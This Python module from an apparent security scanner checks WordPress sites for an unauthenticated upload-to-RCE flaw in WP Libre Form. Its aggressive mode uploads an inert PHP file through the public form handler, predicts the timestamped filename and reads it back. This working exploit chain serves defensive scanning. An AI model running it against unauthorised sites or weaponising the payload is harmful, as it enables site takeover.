from __future__ import annotations

import re
import secrets
from datetime import datetime, timedelta, timezone
from email.utils import parsedate_to_datetime
from typing import Any

from ...core.http import HttpClient, build_multipart, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding

CVE_ID = "CVE-2026-118423"
NAME = "WP Libre Form unauthenticated upload to RCE"
COMPONENT = "WP Libre Form"
AFFECTED_RULE = "WP Libre Form through 1.5.0.1; no fixed release (plugin closed 2026-09-08)"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
AJAX_PATH = "/wp-admin/admin-ajax.php"
MARKER_PREFIX = "PROOFCMS_118423_"
SHORTCODE_RE = re.compile(r"\[libre-form\s+id[=:]\s*[\"']?(\d+)")
FORM_INPUT_RE = re.compile(r'name=["\']_form_id["\']\s+value=["\'](\d+)["\']')


def _numeric_version(version: str | None) -> str | None:
    match = re.search(r"(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def _classify(version: str | None) -> str:
    parsed = _numeric_version(version)
    if not parsed:
        return "DETECTED_VERSION_UNKNOWN"
    parts = parsed.split(".")
    try:
        vulnerable = tuple(int(p) for p in parts[:3]) <= (1, 5, 1)
    except ValueError:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if vulnerable else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = _plugin_info(plugins) if plugins else {}
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="WP Libre Form was not detected through its public asset paths.", action="No action is required unless the plugin is installed but hidden from public detection.")
    version = info.get("version")
    status = _classify(version)
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence="HIGH" if version else "MEDIUM", component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=f"Detected WP Libre Form {version or '(version unknown)'}; form submissions are written with move_uploaded_file() and no extension validation on the default path.", action="Remove the plugin or enable the media-library storage path; no vendor patch exists.")


def _plugin_info(plugins: dict[str, Any] | None) -> dict[str, Any]:
    for key in ("wp-libre-form", "wp_libre_form", "libre_form"):
        info = (plugins or {}).get(key)
        if isinstance(info, dict):
            return info
    return {}


def _form_id(client: HttpClient, base: str, timeout: int, explicit: int | None) -> int | None:
    if explicit:
        return explicit
    for pid in range(1, 26):
        response = client.get(f"{base}/?page_id={pid}", timeout=timeout)
        if is_transport_error(response):
            continue
        body = str(response.get("body") or "")
        match = FORM_INPUT_RE.search(body) or SHORTCODE_RE.search(body)
        if match:
            return int(match.group(1))
    return None


def _upload_urls(date_header: str, stem: str) -> list[str]:
    """Build candidate URLs for the predictable ``lf_ymdhs-0-<name>`` file."""
    try:
        server_time = parsedate_to_datetime(date_header).astimezone(timezone.utc)
    except (TypeError, ValueError, OverflowError):
        server_time = datetime.now(timezone.utc)
    urls: list[str] = []
    # The Date header is stamped at response time, while the filename is built
    # when the handler starts; a slow submission can be many seconds older.
    for offset in range(-25, 4):
        moment = server_time + timedelta(seconds=offset)
        ym = moment.strftime("%Y/%m")
        for hour in (moment.strftime("%H"), moment.strftime("%I")):
            # PHP format 'ymdhs' = year, month, day, 12-hour, seconds (no minutes).
            stamp = moment.strftime("%y%m%d") + hour + moment.strftime("%S")
            name = f"lf_{stamp}-0-{stem}"
            urls.append(f"/wp-content/uploads/{ym}/{name}")
    return list(dict.fromkeys(urls))


def run_aggressive_probe(
    target_url: str,
    form_id: int | None = None,
    marker: str = MARKER_PREFIX,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Submit an inert PHP file through a published form and read it back.

    ``wplf_ajax_submit_handler`` is registered on ``wp_ajax_nopriv_wplf_submit``
    and moves every uploaded file into the uploads directory with
    ``sanitize_file_name()`` as the only filter. The stored name is predictable
    (``lf_<ymdhs>-0-<original>``), so the marker can be fetched over HTTP.
    """
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    form = _form_id(client, base, timeout, form_id)
    if not form:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=False, proof_url=f"{base}{AJAX_PATH}", detail="No published [libre-form id=N] shortcode was found and no form id was supplied.", action="Publish a page with a WP Libre Form shortcode or pass --aggressive-arg form_id=<id>.")

    marker_value = marker + secrets.token_hex(6)
    stem = f"proofcms-{secrets.token_hex(4)}.php"
    content_type, body = build_multipart(
        {"action": "wplf_submit", "_form_id": str(form)},
        {"file": (stem, f"<?php echo '{marker_value}'; ?>".encode(), "application/x-php")},
    )
    upload = client.request(
        f"{base}{AJAX_PATH}",
        method="POST",
        headers={"Content-Type": content_type},
        data=body,
        timeout=timeout,
    )
    if is_transport_error(upload):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{AJAX_PATH}", detail=f"The form submission failed in transit ({transport_error_detail(upload)}).", action="Retry when the target is reachable.")
    upload_body = str(upload.get("body") or "")
    if '"ok":1' not in upload_body.replace(" ", "") and '"ok": 1' not in upload_body:
        return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{AJAX_PATH}", evidence={"form_id": form, "response": upload_body[:200]}, detail="The form endpoint did not report a successful submission.", action="Check the form id and publication status before retrying.")

    headers = upload.get("headers") or upload.get("headers_multi") or {}
    date_header = ""
    if isinstance(headers, dict):
        for key, value in headers.items():
            if str(key).lower() == "date":
                date_header = str(value[0] if isinstance(value, list) else value)
                break
    candidates = _upload_urls(date_header, stem)
    found_url = ""
    for path in candidates:
        readback = client.get(f"{base}{path}", timeout=timeout)
        if not is_transport_error(readback) and marker_value in str(readback.get("body") or ""):
            found_url = path
            break
    evidence = {
        "form_id": form,
        "marker": marker_value,
        "uploaded_name": stem,
        "candidate_paths": len(candidates),
        "readback_path": found_url,
    }
    if found_url:
        return Finding(cve=CVE_ID, name=NAME, status="VULNERABLE", confidence="CONFIRMED", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{AJAX_PATH}", uploaded_filename=found_url.lstrip("/"), evidence=evidence, detail="An unauthenticated form submission wrote an inert PHP file into the web-accessible uploads directory under a predictable name; the marker executed on read-back. No command was run.", action="Remove WP Libre Form (no fix exists) or enable the media-library storage path and audit uploads for lf_*.php files.")
    return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="HIGH", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{AJAX_PATH}", evidence=evidence, detail="The upload was accepted but the predicted marker path was not readable; the media-library mitigation path may be active or the server timezone may differ.", action="Check _wplf_media_library and the server timezone.")


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    url = f"{base}/wp-content/plugins/wp-libre-form/readme.txt"
    response = HttpClient(timeout=timeout, proxy=proxy).get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The plugin readme could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable.")
    if response.get("status") != 200:
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The plugin readme returned HTTP {response.get('status')}; WP Libre Form is not publicly installed.", action="No action is required unless the plugin is installed but hidden from public detection.")
    body = str(response.get("body") or "")
    match = re.search(r"Stable tag:\s*([0-9.]+)", body, re.IGNORECASE)
    version = match.group(1) if match else None
    status = _classify(version)
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence="MEDIUM", component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"Read plugin version {version or '(unknown)'} from the public readme (note: the stable tag can be stale); no upload was sent in safe mode.", action="Remove the plugin or enable the media-library storage path.")


def check(target_url: str, cms_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    from ...core.args import aggressive_value

    del cms_version, kwargs
    if not run_exploit_check:
        return passive_result(plugins)
    if exploit_mode == "aggressive":
        form_id = int(aggressive_value(aggressive_args, aggressive_command, "form_id") or 0) or None
        passive = passive_result(plugins)
        if passive.status == "NOT_DETECTED" and not form_id:
            passive.detail += (
                " Aggressive proof skipped because WP Libre Form was not detected; pass "
                "--aggressive-arg form_id=<id> to probe a known published form."
            )
            return passive
        return run_aggressive_probe(
            target_url,
            form_id=form_id,
            marker=aggressive_value(aggressive_args, aggressive_command, "marker") or MARKER_PREFIX,
            timeout=timeout,
            proxy=proxy,
        )
    result = run_safe_probe(target_url, timeout, proxy)
    result.detail += " This module supports safe (manifest version) and aggressive (inert upload + read-back) modes."
    return result


def cleanup(
    target_url: str,
    *,
    timeout: int = 12,
    proxy: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    aggressive_command: str | None = None,
) -> dict[str, Any]:
    """Verify an uploaded marker and report the manual removal step.

    WordPress serves uploads statically, so the probe cannot delete the file
    over HTTP. The hook still checks whether it is present so a report can
    distinguish an already-cleaned lab from a leftover artifact.
    """
    from ...core.args import aggressive_value
    from ...core.cleanup import cleanup_result

    path = aggressive_value(aggressive_args, aggressive_command, "file")
    if not path:
        return cleanup_result(manual=["re-run with --aggressive-arg file=<uploaded_filename> from the probe evidence"])
    if str(path).startswith(("http://", "https://")):
        url = str(path)
    else:
        url = f"{normalize_url(target_url)}/{str(path).lstrip('/')}"
    response = HttpClient(timeout=timeout, proxy=proxy).get(url, timeout=timeout)
    if not is_transport_error(response) and response.get("status") == 200:
        return cleanup_result(
            remaining=[url],
            manual=[f"delete the uploaded file: {url}"],
            detail="The uploaded file is still served; delete it on the lab host.",
        )
    return cleanup_result(removed=[url], detail="The uploaded file is no longer served.")


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "wordpress", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_versions": ["<=1.5.0.1"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "Unrestricted Upload / RCE", "module_version": "1.0.0", "last_reviewed": "2026-11-20", "updated": "2026-11-20", "required_detectors": ["wp-libre-form"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-118423", "https://github.com/im0xfay/CVE-2026-118423", "https://github.com/anttiviljami/wp-libre-form"]}
